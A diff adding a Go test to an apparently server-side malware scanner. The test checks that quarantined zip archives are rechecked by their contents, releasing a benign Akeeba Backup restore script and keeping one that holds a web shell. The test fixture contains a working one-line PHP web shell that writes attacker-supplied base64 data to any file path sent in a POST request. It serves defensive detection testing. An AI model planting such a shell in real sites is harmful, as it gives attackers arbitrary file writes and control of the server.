@@ -1843,3 +1843,41 @@ func TestFleetAkeebaRestoreDebugLog(t *testing.T) {
 		}
 	}
 }
+
+// business600 joomlash (2026-11-03): the extension packages quarantined as
+// Archive.PHP.Backdoor.FileDropper (Akeeba Backup Pro) and
+// Archive.PHP.Obfuscated.SplitFunctionName (JExtStore) were skipped by
+// findings.recheck, which only judged scripts, so a fixed rule never gave
+// them back. A quarantined zip is now judged by its members; a zip that
+// still holds a web shell stays.
+func TestFleetRecheckQuarantinedZip(t *testing.T) {
+	s := newScanner(t)
+	dir := t.TempDir()
+	mk := func(name, member, body string) string {
+		q := filepath.Join(dir, name)
+		f, _ := os.Create(q)
+		zw := zip.NewWriter(f)
+		w, _ := zw.Create(member)
+		w.Write([]byte(body))
+		zw.Close()
+		f.Close()
+		return q
+	}
+	akeeba := "<?php\nfunction getQueryParam($key, $default = null)\n{\n\t$value = $default;\n\tif (array_key_exists($key, $_REQUEST))\n\t{\n\t\t$value = $_REQUEST[$key];\n\t}\n\treturn $value;\n}\n\n" +
+		"function debugMsg($msg)\n{\n\t$fp = fopen('debug.txt', 'a');\n\tfwrite($fp, $msg . PHP_EOL);\n\tfclose($fp);\n}\n" +
+		"function dec($c) { $c = base64_decode($c); $o = ''; for ($i = 0; $i < strlen($c); $i++) { $o .= chr(ord($c[$i]) ^ 7); } return $o; }\n"
+	shell := "<?php $d = base64_decode($_POST['d']); $h = fopen($_POST['f'], 'w'); fwrite($h, $d . chr(10)); fclose($h);"
+	rows := []struct{ path, q string }{
+		{"/home/u/tmp/com_akeebabackup-pro.zip", mk("a.zip", "backend/restore.php", akeeba)},
+		{"/home/u/jdownloads/evil-pack.zip", mk("b.zip", "admin/up.php", shell)},
+	}
+	for i, r := range rows {
+		if _, err := s.DB.Exec(`INSERT INTO findings (id, source, path, owner, category, signature, status, qpath, created_at, updated_at) VALUES (?, 'realtime', ?, 'u', 'virus', 'Archive.PHP.Backdoor.FileDropper', 'quarantined', ?, 1, 1)`, i+1, r.path, r.q); err != nil {
+			t.Fatal(err)
+		}
+	}
+	rep, err := s.Recheck(RecheckFilter{}, nil)
+	if err != nil || rep.Checked != 2 || rep.Still != 1 || len(rep.Clean) != 1 || rep.Clean[0].ID != 1 {
+		t.Fatalf("%+v %v", rep, err)
+	}
+}
